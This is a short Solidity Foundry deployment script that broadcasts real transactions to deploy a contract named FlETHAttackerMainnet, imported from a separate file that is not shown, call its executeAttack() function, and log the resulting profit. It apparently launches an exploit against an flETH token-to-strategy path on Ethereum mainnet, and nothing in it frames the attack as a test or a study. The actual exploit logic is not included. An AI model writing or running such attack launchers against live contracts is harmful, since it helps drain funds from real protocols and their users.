// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/FlETHAttackerMainnet_flETH_to_Strategy_2.sol";

contract DeployAndAttack3 is Script {
    function run() external {
        vm.startBroadcast();

        FlETHAttackerMainnet attacker = new FlETHAttackerMainnet();
        console.log("Contract deployed at:", address(attacker));

        attacker.executeAttack();
        console.log("SUCCESS!");
        console.log("Attack executed!");
        console.log("Profit:", attacker.profit());

        vm.stopBroadcast();
    }
}
